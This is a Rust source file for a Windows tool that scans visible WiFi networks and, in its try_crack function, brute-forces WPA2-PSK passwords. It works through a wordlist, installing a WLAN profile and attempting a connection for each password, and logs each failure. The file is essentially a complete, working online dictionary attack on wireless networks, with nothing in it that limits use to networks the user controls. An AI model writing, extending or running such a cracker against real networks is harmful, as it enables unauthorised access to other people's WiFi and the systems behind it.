// wifi.rs — Windows WLAN brute-force + scanner logic

use std::{
    collections::HashSet,
    fs::File,
    io::{BufRead, BufReader},
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc, Mutex,
    },
    thread,
    time::Duration,
};
use windows::{
    core::HSTRING,
    Win32::Foundation::HANDLE,
    Win32::NetworkManagement::WiFi::{
        WlanCloseHandle, WlanConnect, WlanEnumInterfaces,
        WlanFreeMemory, WlanGetAvailableNetworkList, WlanOpenHandle,
        WlanScan, WlanSetProfile,
        WLAN_AVAILABLE_NETWORK, WLAN_AVAILABLE_NETWORK_LIST,
        WLAN_CONNECTION_PARAMETERS, WLAN_INTERFACE_INFO_LIST,
        dot11_BSS_type_any, wlan_connection_mode_profile,
    },
};

use crate::SharedState;

// ── Public types ──────────────────────────────────────────────────────────────

/// One visible WiFi network returned by `scan_networks()`.
#[derive(Clone)]
pub struct NetworkEntry {
    pub ssid:      String,
    pub signal:    u32,     // 0–100 quality percentage
    pub connected: bool,    // OS is currently connected to this SSID
    pub secured:   bool,    // WPA/WPA2/WPA3 – requires password
    pub band:      Band,    // 2.4 GHz or 5 GHz
}

/// Radio band inferred from the channel/signal heuristic provided by the OS.
#[derive(Clone, PartialEq)]
pub enum Band {
    GHz2_4,
    GHz5,
    Unknown,
}

// ── Public API ────────────────────────────────────────────────────────────────

/// Triggers a fresh OS scan, waits ~2 s, then returns a deduplicated,
/// signal-strength-sorted list of visible WiFi networks.
pub fn scan_networks() -> Result<Vec<NetworkEntry>, String> {
    let handle = open_handle()?;
    let guid   = get_first_iface_guid(handle)?;

    // Ask the OS to do a fresh scan (fire-and-forget; ignore return value)
    unsafe { let _ = WlanScan(handle, &guid, None, None, None); }
    thread::sleep(Duration::from_secs(2));

    let mut list_ptr: *mut WLAN_AVAILABLE_NETWORK_LIST = std::ptr::null_mut();
    let rc = unsafe { WlanGetAvailableNetworkList(handle, &guid, 3, None, &mut list_ptr) };
    if rc != 0 || list_ptr.is_null() {
        unsafe { WlanCloseHandle(handle, None) };
        return Err(format!("WlanGetAvailableNetworkList failed (code {rc})"));
    }

    // The Network field is a flexible array [WLAN_AVAILABLE_NETWORK; 1] in Rust,
    // but Windows allocates dwNumberOfItems entries.  Use raw pointer arithmetic.
    let count = unsafe { (*list_ptr).dwNumberOfItems } as usize;
    let base  = unsafe {
        std::ptr::addr_of!((*list_ptr).Network[0]) as *const WLAN_AVAILABLE_NETWORK
    };

    let mut entries: Vec<NetworkEntry> = Vec::new();
    let mut seen:    HashSet<String>   = HashSet::new();

    for i in 0..count {
        let net = unsafe { &*base.add(i) };
        let ssid_len = net.dot11Ssid.uSSIDLength as usize;
        if ssid_len == 0 { continue; }

        let ssid = String::from_utf8_lossy(&net.dot11Ssid.ucSSID[..ssid_len]).to_string();
        if ssid.is_empty() || seen.contains(&ssid) { continue; }
        seen.insert(ssid.clone());

        // Infer band from dot11PhyList if available, else Unknown
        let band = infer_band(net);

        entries.push(NetworkEntry {
            ssid,
            signal:    net.wlanSignalQuality,
            connected: net.dwFlags & 0x0001 != 0,          // WLAN_AVAILABLE_NETWORK_CONNECTED
            secured:   net.bSecurityEnabled.0 != 0,
            band,
        });
    }

    unsafe { WlanFreeMemory(list_ptr as *mut _) };
    unsafe { WlanCloseHandle(handle, None) };

    // Strongest first
    entries.sort_by(|a, b| b.signal.cmp(&a.signal));
    Ok(entries)
}

/// Reads `wordlist_path` line-by-line and attempts a WPA2-PSK connection for each
/// password.  Each attempt is logged into `state`.  Returns the cracked password on
/// success, `None` when the list is exhausted, or `None` early if `stop` is set.
pub fn try_crack(
    ssid: &str,
    wordlist_path: &str,
    state: Arc<Mutex<SharedState>>,
    stop: Arc<AtomicBool>,
) -> Result<Option<String>, String> {
    let handle = open_handle()?;
    let guid   = get_first_iface_guid(handle)?;

    let file   = File::open(wordlist_path)
        .map_err(|e| format!("Cannot open wordlist: {e}"))?;
    let reader = BufReader::new(file);

    let mut number: u32 = 0;
    for line in reader.lines() {
        // ── Stop requested? ──────────────────────────────────────────────
        if stop.load(Ordering::Relaxed) {
            unsafe { WlanCloseHandle(handle, None) };
            state.lock().unwrap().log.push("⏹  Attack stopped by user.".into());
            return Ok(None);
        }

        let password = match line {
            Ok(l)  => l.trim().to_string(),
            Err(_) => continue,
        };
        if password.is_empty() { continue; }
        number += 1;

        if attempt_connect(handle, &guid, ssid, &password) {
            thread::sleep(Duration::from_secs(3));
            unsafe { WlanCloseHandle(handle, None) };
            return Ok(Some(password));
        } else {
            state.lock().unwrap()
                .log.push(format!("[{}] Failed: {}", number, password));
        }
    }

    unsafe { WlanCloseHandle(handle, None) };
    Ok(None)
}

// ── Private helpers ───────────────────────────────────────────────────────────

/// Try to infer whether a network is 2.4 GHz or 5 GHz.
/// Windows' dot11PhyType values: 4 = OFDM (5 GHz-only), 7 = HT, 8 = VHT …
/// We use a simple heuristic: any PHY type ≥ 7 almost certainly means 5 GHz capable;
/// if we cannot tell we return Unknown.
fn infer_band(net: &WLAN_AVAILABLE_NETWORK) -> Band {
    // dot11PhyTypes is a fixed-size array; dwNumberOfPhyTypes tells us how many are valid.
    let n = net.uNumberOfPhyTypes as usize;
    for i in 0..n.min(8) {
        let phy = net.dot11PhyTypes[i].0;
        // OFDM = 4 (5 GHz pure), HT = 7, VHT = 8, HE = 9, EHT = 10
        if phy == 4 || phy >= 7 {
            return Band::GHz5;
        }
        // HR-DSSS = 2, ERP = 6 → definitely 2.4 GHz
        if phy == 2 || phy == 5 || phy == 6 {
            return Band::GHz2_4;
        }
    }
    Band::Unknown
}

fn open_handle() -> Result<HANDLE, String> {
    let mut version: u32 = 0;
    let mut handle = HANDLE::default();
    let rc = unsafe { WlanOpenHandle(2, None, &mut version, &mut handle) };
    if rc != 0 {
        Err(format!("WlanOpenHandle failed (code {rc}) — run as Administrator?"))
    } else {
        Ok(handle)
    }
}

fn get_first_iface_guid(handle: HANDLE) -> Result<windows::core::GUID, String> {
    let mut list_ptr: *mut WLAN_INTERFACE_INFO_LIST = std::ptr::null_mut();
    let rc = unsafe { WlanEnumInterfaces(handle, None, &mut list_ptr) };
    if rc != 0 {
        unsafe { WlanCloseHandle(handle, None) };
        return Err(format!("WlanEnumInterfaces failed (code {rc})"));
    }
    if list_ptr.is_null() {
        unsafe { WlanCloseHandle(handle, None) };
        return Err("No WLAN interfaces found.".into());
    }
    let guid = unsafe { (*list_ptr).InterfaceInfo[0].InterfaceGuid };
    unsafe { WlanFreeMemory(list_ptr as *mut _) };
    Ok(guid)
}

/// Installs a WPA2-PSK profile and attempts a connection. Returns `true` if the
/// interface is connected after the attempt.
fn attempt_connect(
    handle: HANDLE,
    guid: &windows::core::GUID,
    ssid: &str,
    password: &str,
) -> bool {
    let xml   = build_profile_xml(ssid, password);
    let xml_h = HSTRING::from(xml.as_str());
    let mut reason: u32 = 0;

    let rc = unsafe {
        WlanSetProfile(handle, guid, 0, &xml_h, None, true, None, &mut reason)
    };
    if rc != 0 { return false; }

    let profile_name = HSTRING::from(ssid);
    let params = WLAN_CONNECTION_PARAMETERS {
        wlanConnectionMode: wlan_connection_mode_profile,
        strProfile:         windows::core::PCWSTR(profile_name.as_ptr()),
        pDot11Ssid:         std::ptr::null_mut(),
        pDesiredBssidList:  std::ptr::null_mut(),
        dot11BssType:       dot11_BSS_type_any,
        dwFlags:            0,
    };

    let rc = unsafe { WlanConnect(handle, guid, &params, None) };
    if rc != 0 { return false; }

    // Mirror Python's time.sleep(0.35) before checking status
    thread::sleep(Duration::from_millis(350));
    check_connected(handle, guid)
}

/// Returns `true` if any network in the adapter's list has the CONNECTED flag set.
fn check_connected(handle: HANDLE, guid: &windows::core::GUID) -> bool {
    let mut list_ptr: *mut WLAN_AVAILABLE_NETWORK_LIST = std::ptr::null_mut();
    let rc = unsafe { WlanGetAvailableNetworkList(handle, guid, 3, None, &mut list_ptr) };
    if rc != 0 || list_ptr.is_null() { return false; }

    let count = unsafe { (*list_ptr).dwNumberOfItems } as usize;
    let base  = unsafe {
        std::ptr::addr_of!((*list_ptr).Network[0]) as *const WLAN_AVAILABLE_NETWORK
    };

    let mut connected = false;
    for i in 0..count {
        let net = unsafe { &*base.add(i) };
        if net.dwFlags & 0x0001 != 0 {
            connected = true;
            break;
        }
    }

    unsafe { WlanFreeMemory(list_ptr as *mut _) };
    connected
}

// ── WPA2-PSK XML profile builder ──────────────────────────────────────────────

fn build_profile_xml(ssid: &str, password: &str) -> String {
    let s = xml_escape(ssid);
    let p = xml_escape(password);
    format!(
        r#"<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{s}</name>
    <SSIDConfig><SSID><name>{s}</name></SSID></SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{p}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"#
    )
}

fn xml_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&apos;")
}
